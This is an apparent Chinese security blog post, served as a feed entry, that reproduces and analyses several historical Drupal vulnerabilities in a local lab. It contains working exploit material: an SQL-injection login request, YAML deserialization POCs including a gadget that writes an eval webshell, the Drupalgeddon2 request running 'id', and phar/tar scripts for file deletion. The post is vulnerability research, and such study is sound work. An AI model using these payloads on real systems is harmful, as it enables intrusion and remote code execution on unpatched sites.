    <link href="http://ca0y1h.top/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/PHP/16.Drupal%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-01-22T13:35:34.000Z</published>
    <updated>2021-01-22T13:38:44.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Durpal历史漏洞复现记录">Durpal历史漏洞复现记录</h1><p>在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：</p><p><a href="https://blog.csdn.net/u011474028/article/details/53021051">https://blog.csdn.net/u011474028/article/details/53021051</a></p><p><a href="https://blog.fleeto.us/post/drupal-from-request-to-response/">https://blog.fleeto.us/post/drupal-from-request-to-response/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><h2 id="CVE-2014-3704-SQL注入漏洞">CVE-2014-3704 SQL注入漏洞</h2><h3 id="影响版本">影响版本</h3><p>Drupal &lt; 7.32</p><h3 id="环境安装">环境安装</h3><p>从官网中下载Drupal 7.31版本的源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.drupal.org/project/drupal/releases/7.31</span><br></pre></td></tr></table></figure><p>使用MAMP Pro搭建站点后，更改数据库的相关配置：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127141314.png" alt=""></p><p>访问本地IP:8080端口，使用默认安装配置即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127132647.png" alt=""></p><p>验证安装成功：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140826.png" alt=""></p><p>在不登录的情况下，验证payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?q&#x3D;node&amp;destination&#x3D;node HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201127140938.png" alt=""></p><h3 id="漏洞分析">漏洞分析</h3><p>我们可以从上面这张图中看出，漏洞的触发点是在user.module文件中的<code>user_login_authenticate_validate()</code>这个函数。</p><p>下断点调试，查看函数调用栈：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201231923.png" alt=""></p><p>这个函数在2149行对准备将提交的name参数进行SQL语句拼接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232302.png" alt=""></p><p>继续跟进<code>db_query</code>函数，此时payload存储在args数组中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201201232615.png" alt=""></p><p>调用<code>query()</code>函数，在这个函数中，继续调用<code>expandArguments</code>进行实质的SQL语句拼接</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161036.png" alt=""></p><p>此时query已经是拼接后的SQL语句</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161432.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161523.png" alt=""></p><p>最后执行SQL</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161630.png" alt=""></p><p>在mysql monitor工具中可以看到具体的执行语句</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201128161715.png" alt=""></p><h2 id="CVE-2017-6920-反序列化任意代码执行漏洞">CVE-2017-6920 反序列化任意代码执行漏洞</h2><h3 id="影响版本-v2">影响版本</h3><p>Drupal 8 &lt; 8.3.3</p><h3 id="环境安装-v2">环境安装</h3><p>从官网中下载Durpal 8.3.0版本的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.3.0</span><br></pre></td></tr></table></figure><p>使用MAMP Pro集成环境搭建，更改php.ini配置，打开Yaml扩展：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130359.png" alt=""></p><p>查看PHPINFO验证是否开启Yaml扩展：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130431.png" alt=""></p><p>必须在配置文件中启用yaml.decode_php，否则无法复现成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yaml.decode_php &#x3D; 1</span><br></pre></td></tr></table></figure><ol><li><p>登录管理员账号</p></li><li><p>访问<code>http://127.0.0.1:8080/admin/config/development/configuration/single/import</code></p></li><li><p>POC：<code>!php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130726.png" alt=""></p></li></ol><p>成功执行phpinfo</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133316.png" alt=""></p><h3 id="漏洞分析-v2">漏洞分析</h3><p>查看官方的commit记录可以发现漏洞的触发点：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133822.png" alt=""></p><p>可以看到8.3.4版本的decode函数新增了一段代码，其作用主要就是改变PHP配置文件中的<code>yaml.decode_php=0</code>，那么我们就跟进这个文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134115.png" alt=""></p><p>漏洞所在函数<code>decode</code>的触发点代码就是上图中调用<code>yaml_parse</code>这个函数，其中<code>$raw</code>参数直接被带入<code>yaml_parse</code>函数中，看一下官方文档对于这个函数的描述：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134255.png" alt=""></p><p>第一个参数是需要parse成yaml的文档流，并且这个参数是从这个函数外部输入的。另外，在官方文档的下方有一个对这个函数的特别说明：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134439.png" alt=""></p><p>意思就是如果使用了<code>!php/object</code>tag，yaml_parse会对第一个参数调用unserialize()，如果要禁止这样做，就通过设置<code>yaml.decode_php</code>来处理，这就是官方补丁在<code>decode</code>函数前面加的那几行代码。</p><p>因此，这个远程代码执行漏洞的罪魁祸首就是<code>yaml_parse</code>函数可能会用反序列化的形式来处理输入的字符串，从而导致通过反序列化类的方式来操作一些危险类，最终实现代码执行。</p><p>那么控制decode函数的参数<code>$raw</code>就可以出发这个漏洞。回溯定位<code>decode</code>函数的调用位置，在<code>core/lib/Drupal/Component/Serialization/Yaml.php</code>文件中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202135144.png" alt=""></p><p>在第34行该函数调用了getSerializer函数，跟进到第48行，首先判断是否存在yaml扩展，如果存在的话就使用<code>YamlPecl</code>类，然后调用这个类中的<code>decode</code>函数，也就是会调用<code>yaml_parse</code>函数。</p><p>继续回溯调用<code>Yaml::decode</code>函数的地方，全局查找一共有36处地方：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202140845.png" alt=""></p><p>其中外部可控的地方只有一处，位于<code>ConfigSingleImportForm.php</code>文件中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141142.png" alt=""></p><p>这里对外部输入的import值进行<code>Yaml::decode</code>操作，那么这就是漏洞的数据触发点。</p><p>既然是反序列化，那么就需要找到一个可以反序列化的类。全局搜索<code>__destruct</code>或<code>__wakeup</code>关键字，一般而言<code>__destruct</code>更容易利用。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141427.png" alt=""></p><ol><li><p><code>/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202143842.png" alt=""></p><p>通过反序列化这个类可以造成写入webshell，但是利用过程相比后面两个而言更为麻烦一点。PHPGGC已经包含了这个gadget，拿过来稍微改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">SetCookie</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Value&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Expires&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;Discard&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;Domain&#x27;</span> =&gt; $data</span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cookies = [];</span><br><span class="line">    <span class="keyword">private</span> $strictMode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;cookies = [<span class="keyword">new</span> SetCookie($data)];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">FileCookieJar</span> <span class="keyword">extends</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename;</span><br><span class="line">    <span class="keyword">private</span> $storeSessionCookies = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $new = <span class="keyword">new</span> FileCookieJar(<span class="string">&#x27;/Users/ca01h/Desktop/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>/vendor/symfony/process/Pipes/WindowsPipes.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161528.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161558.png" alt=""></p><p>反序列化这个类可以造成任意文件删除。</p></li><li><p><code>/vendor/guzzlehttp/psr7/src/FnStream.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161812.png" alt=""></p><p>反序列化这个类可以实现无参数RCE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">FnStream</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $methods</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Create the functions on the class</span></span><br><span class="line">      <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="string">&#x27;_fn_&#x27;</span> . $name&#125; = $fn;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new = <span class="keyword">new</span> FnStream(<span class="keyword">array</span>(<span class="string">&quot;close&quot;</span> =&gt; <span class="string">&quot;phpinfo()&quot;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CVE-2018-7600-远程命令执行漏洞">CVE-2018-7600 远程命令执行漏洞</h2><h3 id="影响版本-v3">影响版本</h3><p>Drupal 7 &lt; 7.58</p><p>Drupal 8.3.x &lt; 8.3.9</p><p>Drupal 8.4.x &lt; 8.4.6</p><p>Drupal 8.5.x &lt; 8.5.1</p><h3 id="环境安装-v3">环境安装</h3><p>从官网中下载Durpal 8.5.0版本的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.5.0</span><br></pre></td></tr></table></figure><p>使用MAMP Pro搭建，成功安装后，在不登录的情况下发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;register?element_parents&#x3D;account&#x2F;mail&#x2F;%23value&amp;ajax_form&#x3D;1&amp;_wrapper_format&#x3D;drupal_ajax HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_register_form&amp;_drupal_ajax&#x3D;1&amp;mail[#post_render][]&#x3D;exec&amp;mail[#type]&#x3D;markup&amp;mail[#markup]&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202210038.png" alt=""></p><h3 id="漏洞分析-v3">漏洞分析</h3><p><a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a></p><p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><h2 id="CVE-2018-7602-远程命令执行漏洞">CVE-2018-7602 远程命令执行漏洞</h2><p><a href="http://blog.nsfocus.net/cve-2018-7602-drupal/">http://blog.nsfocus.net/cve-2018-7602-drupal/</a></p><h2 id="CVE-2019-6339-远程代码执行漏洞">CVE-2019-6339 远程代码执行漏洞</h2><p><a href="https://paper.seebug.org/897/">https://paper.seebug.org/897/</a></p><h2 id="CVE-2019-6341-1-click-XSS">CVE-2019-6341 1-click XSS</h2><h2 id="CVE-2020-28948-28949-远程代码执行漏洞-任意文件覆盖漏洞">CVE-2020-28948/28949 远程代码执行漏洞/任意文件覆盖漏洞</h2><h3 id="影响版本-v4">影响版本</h3><p>Drupal 9 &lt; 9.0.9</p><p>Drupal 8.9 &lt; 8.9.10</p><p>Drupal 8.8 &lt; 8.8.12</p><p>Drupal 8.x (x≠8)</p><p>Drupal 7 &lt; 7.75</p><h3 id="漏洞分析-v4">漏洞分析</h3><p>先查看Drupal官方发的漏洞通报：</p><p><a href="https://www.drupal.org/sa-core-2020-013">https://www.drupal.org/sa-core-2020-013</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209143410.png" alt=""></p><p>通报中提到，Drupal使用了Archive_Tar第三方PEAR组件，而这个组件最近发布了一版安全更新，那么就先去官方仓库上看看Drupal是怎么修复这个漏洞的。以Drupal 8.9版本为例：</p><p><a href="https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e">https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144007.png" alt=""></p><p>可以很明显的看到，Drupal将Archive_tar的版本从1.4.9升级到1.4.11。所以这个漏洞的源头并不是Drupal代码出了问题，而是第三方组件Archive_tar存在缺陷。那我们就主要分析一下Archive_tar的漏洞成因，同样的，去这个组件的GitHub仓库看两个版本的差异点。</p><p><a href="https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11">https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144432.png" alt=""></p><p>左边是1.4.9版本的代码，右边是1.4.11版本的代码，漏洞的源头就是在于<code>_maliciousFilename</code>函数中。</p><p>作者为了防止反序列化漏洞，过滤了<code>phar://</code>关键字，但明显strpos这种简单的过滤还是太年轻了，可以很容易地用大写来绕过<code>PHAR://exploit.phar</code>，从而导致反序列化漏洞的产生，这就是CVE-2020-28948漏洞的根源。同样CVE-2020-28949漏洞的根源也在这个地方，我们可以使用<code>file://path/to/file/to/be/overwritten</code>协议作为文件名，从而导致文件覆盖的漏洞。</p><p>Archive_tar组件也很简单，就一个PHP文件，具体的漏洞成因我们审计这一个文件即可。</p><p>一共也就两个地方用到了<code>_maliciousfilename</code>这个函数，一个是<code>_readHeader</code>函数，另一个是<code>_readLongHeader</code>函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209150851.png" alt=""></p><p>而从上图可以看到，在<code>_readLongHeader</code>函数中，还是调用了<code>_readHeader</code>函数，所以我们主要分析<code>_readHeader</code>这个函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209152216.png" alt=""></p><p>这个函数比较长，但是通读下来，发现就做了一件事情，读取压缩文件的头部信息，这些信息包括<code>checksum</code>、<code>property</code>，其中<code>property</code>包含了<code>filename</code>、<code>mode</code>、<code>uid</code>、<code>gid</code>、<code>size</code>等等字段，将这些信息存储在<code>$v_header</code>中并返回到上一级函数，那么我们就进行回溯工作，看有哪些地方调用了<code>_readHeader</code>这个函数。</p><p>全局查找后，发现一共有三个地方，分别是<code>_readLongHeader</code>、<code>_extractList</code>和<code>_extractInString</code>，后两个函数对比一下就可以发现，<code>_extractList</code>是一个较为完整的解压缩过程，那从这里开始分析肯定是没错的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209153149.png" alt=""></p><p>在1989行调用了<code>readHeader</code>函数，在我们跟踪<code>$v_header['filename']</code>参数之前，由于函数传参较多，而且参数会很大程度上影响程序流程，所以我们调研一下Archive_tar组件使用方法后发现，解压缩主要是用到<code>extract</code>这个函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143209.png" alt=""></p><p>继续跟进<code>extractModify</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143245.png" alt=""></p><p>在574行调用了<code>_extractList</code>函数，进入上述所说的实质性解压操作。</p><p>根据上图的参数，正常程序流程会进入到2049行的if语句中，并且不会进入到2050行和2062行的if语句中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143940.png" alt=""></p><p>接下来在执行2075行的if语句时，调用了<code>file_exsits</code>函数，参数是原本<code>$v_header['filename']</code>的值，此时如果这个值是<code>PHAR://exploit.phar</code>，并且当前文件夹上传了expliot.phar文件，那么就会触发反序列化漏洞。</p><p>既然是反序列化操作，那么就需要全局搜索<code>__destruct</code>或者<code>__wakeup</code>函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144655.png" alt=""></p><p>全局搜索析构函数后，继续跟进<code>_close</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144758.png" alt=""></p><p>在该函数的最后一部分，当<code>_temp_tarname</code>不为空的时候，会调用<code>unlink</code>删除文件函数，那么这个地方就可以触发任意文件删除的漏洞了。</p><p>分析完漏洞成因后，接下来就是编写漏洞利用的脚本了。首先新建一个<code>ca01h_test</code>的文件，内容随意，接下来编写生成Phar文件的PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Archive_Tar</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $_temp_tarname;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$_temp_tarname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_temp_tarname = $_temp_tarname;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$tar = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;ca01h_test&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($tar);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后再编写python脚本生成一个压缩文件，其中被压缩的文件名是<code>PHAR://exploit.phar</code>，input_file.txt文件内容随意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;PHAR://exploit.phar&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>最后编写触发漏洞的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure><p>运行上面代码后，可以发现<code>ca01h_test</code>文件被删除。</p><p>接下来再讨论一下CVE-2020-28948，产生漏洞的原因同时是因为过滤不严，只是触发漏洞的位置不一样而言。<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210152508.png" alt=""></p><p>程序在第2151行或2158行调用了<code>fwrite</code>函数，将从压缩文件读出来的文件内容写入到<code>$v_header[filename]</code>文件中，那么这个地方就可能造成任意文件覆盖的漏洞。流程如下：</p><p>首先生成一个测试文件，内容随意：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span 